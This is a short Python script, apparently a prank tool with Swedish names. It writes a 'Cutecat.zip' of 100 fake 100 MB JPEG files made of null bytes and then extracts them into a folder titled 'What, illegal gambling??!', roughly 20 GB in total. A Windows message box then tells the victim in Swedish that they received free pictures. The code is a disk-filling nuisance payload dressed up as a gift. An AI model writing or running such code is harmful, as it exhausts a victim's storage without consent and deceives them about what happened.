import zipfile
import os
import threading
import ctypes  # ← add this
from concurrent.futures import ThreadPoolExecutor

def laddaturtle():

    OUTPUT_ZIP = "Cutecat.zip"
    Antalfil = 100
    Filstorlek = 100 * 1024 * 1024 
    
    JPEG_HEADER = bytes([
        0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46,
        0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01,
        0x00, 0x01, 0x00, 0x00,
    ])
    JPEG_FOOTER = bytes([0xFF, 0xD9])
    
    FILLER = b"\x00" * (Filstorlek - len(JPEG_HEADER) - len(JPEG_FOOTER))
    FAKE_JPEG = JPEG_HEADER + FILLER + JPEG_FOOTER

    with zipfile.ZipFile(OUTPUT_ZIP, "w", compression=zipfile.ZIP_STORED) as zf:
        for i in range(1, Antalfil + 1):
            filename = f"pictures/photo_{i:04d}.jpg"
            zf.writestr(filename, FAKE_JPEG)

    with zipfile.ZipFile(OUTPUT_ZIP, "r") as zf:
        names = zf.namelist()
        items = [(name, zf.read(name)) for name in names]

    def write_file(args):
        name, data = args
        out_path = os.path.join("What, illegal gambling??!", name)
        os.makedirs(os.path.dirname(out_path), exist_ok=True)
        with open(out_path, "wb") as f:
            f.write(data)

    os.makedirs("What, illegal gambling??!", exist_ok=True)
    with ThreadPoolExecutor(max_workers=os.cpu_count() * 2) as executor:
        executor.map(write_file, items)

    ctypes.windll.user32.MessageBoxW(0, "Du fick nyss 10 gb av bilder😘", "Gratis bilder!", 1)  # ← fixed

"""a = threading.Thread(target=laddaturtle)
a.start()"""